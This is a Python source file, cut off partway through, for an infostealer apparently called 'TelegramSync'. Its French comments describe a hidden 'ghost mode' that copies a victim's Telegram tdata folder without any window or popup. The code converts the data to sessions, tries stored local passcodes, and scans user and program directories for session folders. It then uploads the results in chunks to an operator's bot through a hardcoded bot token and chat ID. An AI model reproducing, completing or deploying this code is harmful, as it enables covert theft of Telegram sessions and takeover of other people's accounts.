# -*- coding: utf-8 -*-
"""
TelegramSync - tdata -> .session par compte -> envoi vers ton bot Telegram.

Mode fantome : aucune fenetre, aucun popup, tout passe par le bot.
Ne modifie JAMAIS le tdata de la victime (lecture seule via snapshot).

Surcharges :
  TG_TDATA      chemin force vers le dossier tdata
  TG_PASSCODE   code d'acces local (si passcodes.txt ne suffit pas)
  passcodes.txt a cote de l'exe : un code par ligne, essayes dans l'ordre
"""
import os, sys, json, shutil, asyncio, zipfile, tempfile, traceback
import subprocess, time
import requests

# ---- pas de console en mode windowed : on se protege de sys.stdout=None ----
if sys.stdout is None or sys.stderr is None:
    class _Null:
        def write(self, *a): pass
        def flush(self): pass
        def isatty(self): return False
    sys.stdout = sys.stdout or _Null()
    sys.stderr = sys.stderr or _Null()

# ---------------------------------------------------------------- CONFIG
BOT_TOKEN = "8710535929:AAE8JvCbRXQ4wkrsVeKwl3yKhBmhsbxfxPA"
CHAT_ID   = 8425878739

API_ID   = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"

# Codes d'acces locaux a essayer (le premier qui dechiffre gagne).
# "" = pas de code. Complete ici, ou depose passcodes.txt a cote de l'exe.
PASSCODES = [""]
# ----------------------------------------------------------------------

WORK = os.path.join(tempfile.gettempdir(), "tgsync")
_NO_WINDOW = 0x08000000 if os.name == "nt" else 0


# ------------------------------------------------------------- chemins
def exe_dir():
    if getattr(sys, "frozen", False):
        return os.path.dirname(os.path.abspath(sys.executable))
    return os.path.dirname(os.path.abspath(sys.argv[0]))


def load_passcodes():
    out = [""]
    for p in [os.environ.get("TG_PASSCODE")] + list(PASSCODES):
        if p is not None and p not in out:
            out.append(p)
    f = os.path.join(exe_dir(), "passcodes.txt")
    if os.path.isfile(f):
        try:
            with open(f, encoding="utf-8-sig") as fh:
                for line in fh:
                    line = line.strip()
                    if line and line not in out:
                        out.append(line)
        except OSError:
            pass
    return out


# ------------------------------------------------------------- bot helpers
def tg_call(method, **kw):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    r = requests.post(url, timeout=600, **kw)
    r.raise_for_status()
    return r.json()


def tg_text(text):
    try:
        tg_call("sendMessage", data={"chat_id": CHAT_ID, "text": text[:4000]})
    except Exception:
        pass


def tg_file(path, caption=""):
    with open(path, "rb") as fh:
        tg_call("sendDocument",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"document": fh})


def tg_big(path, caption="", limit=45 * 1024 * 1024):
    """La Bot API plafonne les documents a 50 Mo -> decoupage en parts."""
    if os.path.getsize(path) <= limit:
        tg_file(path, caption)
        return
    with open(path, "rb") as fh:
        i = 0
        while True:
            chunk = fh.read(limit)
            if not chunk:
                break
            part = f"{path}.part{i:02d}"
            with open(part, "wb") as o:
                o.write(chunk)
            tg_file(part, f"{caption} [part {i:02d}]")
            os.remove(part)
            i += 1


# ------------------------------------------------------------- tdata
def is_tdata_dir(p):
    """Un vrai tdata : key_datas + au moins un dossier de compte (16 hex)."""
    if not p or not os.path.isdir(p):
        return False
    if not os.path.isfile(os.path.join(p, "key_datas")):
        return False
    try:
        return any(len(d) == 16 and os.path.isdir(os.path.join(p, d))
                   for d in os.listdir(p))
    except OSError:
        return False


_SCAN_SKIP = {"temp", "Temp", "tmp", "Cache", "cache", "CachedData",
              "Crashpad", "logs", "node_modules", ".git", ".cache",
              "Packages", "dumps", "emoji", "user_data"}


def _scan_roots():
    return [
        os.path.expandvars(r"%APPDATA%"),
        os.path.expandvars(r"%LOCALAPPDATA%"),
        os.path.expandvars(r"%USERPROFILE%"),
        os.path.expandvars(r"%ProgramFiles%"),
        os.path.expandvars(r"%ProgramFiles(x86)%"),
    ]


def _bounded_scan(max_depth=4):
    """Dernier recours : cherche un dossier tdata* valide, profondeur bornee."""
    found = []
    for root in _scan_roots():
        if not root or not os.path.isdir(root):
            continue
        base = root.rstrip("\\/").count(os.sep)
        try:
            for dirpath, dirnames, _ in os.walk(root):
                if dirpath.rstrip("\\/").count(os.sep) - base >= max_depth:
                    dirnames[:] = []
                dirnames[:] = [d for d in dirnames if d not in _SCAN_SKIP]
                if os.path.basename(dirpath).startswith("tdata") and is_tdata_dir(
